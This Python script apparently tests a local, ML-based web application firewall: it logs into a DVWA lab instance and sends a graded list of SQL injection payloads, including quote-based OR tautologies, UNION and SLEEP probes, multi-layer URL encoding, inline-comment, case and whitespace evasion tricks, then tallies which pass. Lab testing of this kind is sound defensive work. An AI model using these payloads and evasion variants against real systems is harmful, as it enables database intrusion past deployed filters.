#!/usr/bin/env python3
"""
Test simple/basic SQL injection payloads against localhost strict WAF
to see if ANY payload can bypass the ML-based detection
"""

import httpx
import re
from typing import Literal

DVWA_BASE_URL = "http://localhost:8000/modsec_dvwa"
USERNAME = "admin"
PASSWORD = "password"

def login():
    """Login to DVWA and return session cookies"""
    client = httpx.Client(follow_redirects=True, timeout=30.0)
    
    # Get login page to extract user_token
    resp = client.get(f"{DVWA_BASE_URL}/login.php")
    print(f"DEBUG: Login page status: {resp.status_code}, URL: {resp.url}")
    match = re.search(r'user_token["\s\']+value=["\s\']([a-f0-9]+)', resp.text)
    if not match:
        print("❌ Failed to extract user_token")
        print(f"DEBUG: Response text preview: {resp.text[:500]}")
        return None
    
    user_token = match.group(1)
    print(f"DEBUG: Extracted user_token: {user_token}")
    
    # Login
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": user_token
    }
    
    resp = client.post(f"{DVWA_BASE_URL}/login.php", data=login_data)
    print(f"DEBUG: Login POST status: {resp.status_code}, URL: {resp.url}")
    
    if "logout.php" in resp.text or "DVWA Security" in resp.text:
        print("✅ Logged in")
        
        # Set security to low
        resp = client.get(f"{DVWA_BASE_URL}/security.php")
        match = re.search(r'user_token["\s\']+value=["\s\']([a-f0-9]+)', resp.text)
        if match:
            user_token = match.group(1)
            client.post(
                f"{DVWA_BASE_URL}/security.php",
                data={"security": "low", "seclev_submit": "Submit", "user_token": user_token}
            )
            print("✅ Set security to LOW")
        
        return client
    else:
        print("❌ Login failed")
        return None

def test_payload(client: httpx.Client, payload: str) -> Literal["PASSED", "BLOCKED", "ERROR"]:
    """Test a single payload and return result"""
    try:
        url = f"{DVWA_BASE_URL}/vulnerabilities/sqli/"
        params = {"id": payload, "Submit": "Submit"}
        
        resp = client.get(url, params=params, timeout=15.0)
        
        # Check if redirected to login (session lost)
        if "login.php" in resp.url.path:
            return "ERROR"
        
        # Check if WAF blocked (403, 406, or ModSecurity intervention page)
        if resp.status_code in [403, 406]:
            return "BLOCKED"
        
        if "ModSecurity" in resp.text or "Access Denied" in resp.text:
            return "BLOCKED"
        
        # Check for SQL injection success indicators
        success_indicators = [
            "Surname:",           # DVWA success page
            "First name:",        # DVWA output
            "ID exists",          # Valid query
            "mysql_fetch",        # SQL error (means query executed)
            "syntax error",       # SQL error
            "MySQL",              # Database error
        ]
        
        if any(indicator in resp.text for indicator in success_indicators):
            return "PASSED"
        
        # If we got here, probably blocked by WAF silently
        return "BLOCKED"
        
    except Exception as e:
        return "ERROR"

def main():
    print("=" * 80)
    print("[TEST] Testing Simple/Basic Payloads vs Strict WAF")
    print("=" * 80)
    
    client = login()
    if not client:
        return
    
    # Test payloads from simplest to more complex
    test_cases = [
        # Level 1: Completely benign
        ("1", "Benign: Normal ID"),
        ("1'", "Basic: Single quote"),
        ("1 OR 1=1", "Classic: OR 1=1 (no quote)"),
        
        # Level 2: Basic SQL injection
        ("1' OR '1'='1", "Classic: OR with quotes"),
        ("1' OR 1=1--", "Classic: OR with comment"),
        ("1' OR 1=1#", "Classic: OR with hash comment"),
        
        # Level 3: Single URL encoding
        ("1%27", "Encoded: Single quote (%27)"),
        ("1%27%20OR%20%271%27=%271", "Encoded: OR attack"),
        ("1%27%20OR%201=1--", "Encoded: OR with comment"),
        
        # Level 4: Double URL encoding
        ("1%2527", "Double encoded: Single quote"),
        ("1%2527%2520OR%2520%25271%2527=%25271", "Double encoded: OR attack"),
        
        # Level 5: Triple URL encoding
        ("1%25252527", "Triple encoded: Single quote"),
        
        # Level 6: Alternative techniques
        ("1' UNION SELECT 1,2--", "UNION: Basic"),
        ("1' AND 1=1--", "AND: Basic"),
        ("1' AND SLEEP(1)--", "Time-based: SLEEP"),
        
        # Level 7: Comment tricks
        ("1'/**/OR/**/1=1--", "Comment: Inline /**/ blocks"),
        ("1'/*comment*/OR/*comment*/1=1--", "Comment: With text"),
        
        # Level 8: Case variation
        ("1' oR 1=1--", "Case: Mixed case OR"),
        ("1' Or '1'='1", "Case: Capitalized Or"),
        
        # Level 9: Space alternatives
        ("1'+OR+1=1--", "Space: Plus signs"),
        ("1'%09OR%091=1--", "Space: Tab character"),
        ("1'%0aOR%0a1=1--", "Space: Newline"),
    ]
    
    print(f"\nTesting {len(test_cases)} payloads...\n")
    
    passed = 0
    blocked = 0
    errors = 0
    
    for i, (payload, description) in enumerate(test_cases, 1):
        result = test_payload(client, payload)
        
        icon = "✅" if result == "PASSED" else "❌" if result == "BLOCKED" else "⚠️"
        
        # Truncate description for display
        desc_display = description[:45].ljust(45)
        payload_display = payload[:35].ljust(35)
        
        print(f"{i:2}. {icon} {desc_display} | {payload_display} -> {result}")
        
        if result == "PASSED":
            passed += 1
        elif result == "BLOCKED":
            blocked += 1
        else:
            errors += 1
    
    print("\n" + "=" * 80)
    print("📊 Results:")
    if passed + blocked + errors > 0:
        print(f"   PASSED:   {passed}/{len(test_cases)} ({100*passed/len(test_cases):.1f}%)")
        print(f"   BLOCKED: {blocked}/{len(test_cases)}")
        print(f"   ERROR:    {errors}/{len(test_cases)}")
    print("=" * 80)
    
    if passed == 0:
        print("\n⚠️  NO payloads passed - WAF blocks everything including benign queries!")
        print("   → This confirms ML-based detection is VERY strict")
        print("   → Even basic SQL syntax triggers detection")
    elif passed < 3:
        print(f"\n⚠️  Only {passed} payload(s) passed - WAF is extremely strict")
    else:
        print(f"\n✅ {passed} payloads passed - some evasion is possible")

if __name__ == "__main__":
    main()
